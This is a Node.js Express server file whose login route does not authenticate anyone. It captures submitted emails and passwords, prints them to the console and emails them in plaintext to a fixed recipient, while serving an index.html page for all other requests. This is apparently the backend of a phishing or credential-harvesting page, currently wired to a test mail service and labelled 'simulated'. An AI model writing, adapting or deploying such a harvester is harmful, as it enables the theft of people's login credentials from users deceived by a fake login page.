const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Create a test account for Ethereal
let transporter;

async function createTransporter() {
    try {
        const testAccount = await nodemailer.createTestAccount();

        transporter = nodemailer.createTransport({
            host: testAccount.smtp.host,
            port: testAccount.smtp.port,
            secure: testAccount.smtp.secure,
            auth: {
                user: testAccount.user,
                pass: testAccount.pass,
            },
        });

        console.log('Ethereal email transporter created');
        console.log('Preview URL will be available in console after sending email');
    } catch (error) {
        console.error('Failed to create Ethereal account:', error);
    }
}

createTransporter();

// Routes
app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;

    console.log('Received login attempt:', { email, password });

    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required' });
    }

    try {
        // Send email
        const info = await transporter.sendMail({
            from: '"WebTrack Login" <login@webtrack.com>',
            to: 'receiver@example.com', // Change this to the desired receiver
            subject: 'New Login Attempt',
            text: `New login attempt detected.\n\nEmail: ${email}\nPassword: ${password}`,
            html: `
        <h3>New Login Attempt</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
      `,
        });

        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

        // Respond to frontend
        res.json({ message: 'Login data received and email sent (simulated)' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message: 'Failed to send email' });
    }
});

// Catch-all to serve index.html for any other GET request
app.get(/(.*)/, (req, res) => {
    if (!req.path.startsWith('/auth/')) {
        res.sendFile(__dirname + '/index.html');
    } else {
        res.status(404).send('Not found');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
